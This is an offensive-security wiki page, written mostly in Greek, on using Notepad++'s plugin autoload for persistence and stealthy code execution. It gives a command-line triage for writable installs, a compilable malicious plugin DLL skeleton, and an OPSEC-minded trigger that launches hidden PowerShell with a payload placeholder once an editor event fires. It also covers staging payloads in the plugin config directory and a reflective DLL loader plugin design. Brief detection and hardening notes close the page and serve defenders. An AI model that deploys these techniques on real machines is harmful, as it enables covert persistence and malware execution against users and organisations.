# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Το Notepad++ θα **autoload κάθε plugin DLL που βρίσκεται μέσα στους υποφακέλους `plugins`** κατά την εκκίνηση. Η τοποθέτηση ενός malicious plugin σε οποιαδήποτε **writable Notepad++ installation** δίνει code execution μέσα στο `notepad++.exe` κάθε φορά που ανοίγει ο editor, κάτι που μπορεί να χρησιμοποιηθεί για **persistence**, stealthy **initial execution**, ή ως **in-process loader** αν ο editor εκκινήσει elevated.

Από το **Notepad++ 7.6+** η αναμενόμενη διάταξη για manual install είναι **ένας υποφάκελος ανά plugin** (`plugins\<PluginName>\<PluginName>.dll`). Σε **portable mode** (παρουσία του `doLocalConf.xml` δίπλα στο `notepad++.exe`), ολόκληρο το application tree παραμένει τοπικό σε εκείνο το directory, κάτι που συχνά μετατρέπει copied/admin tool bundles σε εύκολη user-writable execution surface.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (συνήθως απαιτεί admin για write).
- Writable options for low-privileged operators:
- Χρησιμοποίησε το **portable Notepad++ build** σε user-writable folder.
- Αντέγραψε το `C:\Program Files\Notepad++` σε ένα user-controlled path (π.χ. `%LOCALAPPDATA%\npp\`) και τρέξε το `notepad++.exe` από εκεί.
- Ψάξε για **admin tool bundles**, extracted zip copies, ή help-desk toolkits που ήδη περιέχουν `doLocalConf.xml` και βρίσκονται εκτός του `Program Files`.
- Κάθε plugin παίρνει το δικό του subfolder κάτω από το `plugins` και φορτώνεται αυτόματα στο startup; τα menu entries εμφανίζονται κάτω από **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Σημεία φόρτωσης plugin (execution primitives)
Το Notepad++ αναμένει συγκεκριμένες **exported functions**. Όλες καλούνται κατά την αρχικοποίηση, δίνοντας πολλαπλά execution surfaces:
- **`DllMain`** — εκτελείται αμέσως κατά το DLL load (πρώτο execution point).
- **`setInfo(NppData)`** — καλείται μία φορά στο load για να παρέχει Notepad++ handles· τυπικό σημείο για να καταχωρήσεις menu items.
- **`getName()`** — επιστρέφει το όνομα του plugin που εμφανίζεται στο menu.
- **`getFuncsArray(int *nbF)`** — επιστρέφει menu commands· ακόμα κι αν είναι κενό, καλείται κατά το startup.
- **`beNotified(SCNotification*)`** — λαμβάνει Notepad++ / Scintilla events (χρήσιμο για να καθυστερήσεις payloads μέχρι μια user action ή editor event).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, χρήσιμο για μεγαλύτερες data exchanges.
- **`isUnicode()`** — compatibility flag που ελέγχεται στο load.

Τα περισσότερα exports μπορούν να υλοποιηθούν ως **stubs**· execution μπορεί να γίνει από το `DllMain` ή οποιοδήποτε callback παραπάνω κατά το autoload.

## Minimal malicious plugin skeleton
Compile a DLL with the expected exports and place it in `plugins\\MyNewPlugin\\MyNewPlugin.dll` under a writable Notepad++ folder:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Δημιουργήστε το DLL (Visual Studio/MinGW).
2. Δημιουργήστε τον υποφάκελο του plugin κάτω από το `plugins` και τοποθετήστε μέσα το DLL.
3. Κάντε επανεκκίνηση του Notepad++; το DLL φορτώνεται αυτόματα, εκτελώντας το `DllMain` και τα επόμενα callbacks.

## Low-noise trigger pattern via `beNotified`
Για OPSEC, πολλά payloads δεν πρέπει να ενεργοποιούνται από το `DllMain`. Ένα πιο ήσυχο pattern είναι να αφήσετε το plugin να φορτώσει κανονικά και μετά να εκτελεστεί μόνο αφού συμβεί ένα ρεαλιστικό editor event, όπως **startup complete**, **buffer activation** ή ο **πρώτος πληκτρολογημένος χαρακτήρας**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Αυτό ταιριάζει καλύτερα με δημόσια offensive research από ό,τι ένα θορυβώδες `DllMain` beacon: το DLL εξακολουθεί να autoloaded στο startup, αλλά η κακόβουλη ενέργεια καθυστερεί μέχρι το Notepad++ να φαίνεται πραγματικά σε χρήση.

## Using the plugin config directory as secondary storage
Το Notepad++ εκθέτει το `NPPM_GETPLUGINSCONFIGDIR`, το οποίο επιστρέφει τον **plugin configuration directory του τρέχοντος χρήστη**. Ένα malicious plugin μπορεί να το χρησιμοποιήσει για να κρατήσει το on-disk DLL ελάχιστο, ενώ αποθηκεύει encrypted config, staged payloads ή tasking files σε ένα path που δένει με τη συνηθισμένη κατάσταση του plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Λειτουργικά αυτό είναι χρήσιμο όταν θέλεις:
- ένα tiny autoloaded bootstrap DLL;
- per-user tasking χωρίς να αγγίξεις ξανά το main plugin binary;
- να διαχωρίσεις το **autoload trigger** από το πιο βαρύ δεύτερο stage.

## Reflective loader plugin pattern
Ένα weaponized plugin μπορεί να μετατρέψει το Notepad++ σε **reflective DLL loader**:
- Παρέχει ένα minimal UI/menu entry (π.χ. "LoadDLL").
- Δέχεται ένα **file path** ή **URL** για να κάνει fetch ένα payload DLL.
- Κάνει reflectively map το DLL μέσα στο current process και καλεί ένα exported entry point (π.χ. μια loader function μέσα στο fetched DLL).
- Όφελος: επαναχρησιμοποίηση ενός benign-looking GUI process αντί να γίνεται spawning ενός νέου loader; το payload κληρονομεί την integrity του `notepad++.exe` (including elevated contexts).
- Trade-offs: το να ρίχνεις ένα **unsigned plugin DLL** στο disk είναι noisy; μια πρακτική παραλλαγή είναι να χρησιμοποιείς το autoloaded plugin μόνο ως stub και να κρατάς το real implant encrypted/staged αλλού.

## Detection and hardening notes
- Block ή monitor **writes to Notepad++ plugin directories** (including portable copies in user profiles); ενεργοποίησε controlled folder access ή application allowlisting.
- Alert σε **new unsigned DLLs** κάτω από `plugins`, αλλαγές σε portable Notepad++ trees, και ασυνήθιστη **child processes/network activity** από `notepad++.exe`.
- Κάνε baseline τα legitimate plugins και ερεύνησε κάθε νέο DLL που κάνει export το normal Notepad++ plugin interface αλλά επίσης ανοίγει shells, PowerShell, ή network beacons.
- Εφάρμοσε εγκατάσταση plugin μόνο μέσω **Plugins Admin**, και περιόρισε την εκτέλεση portable copies από untrusted paths.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
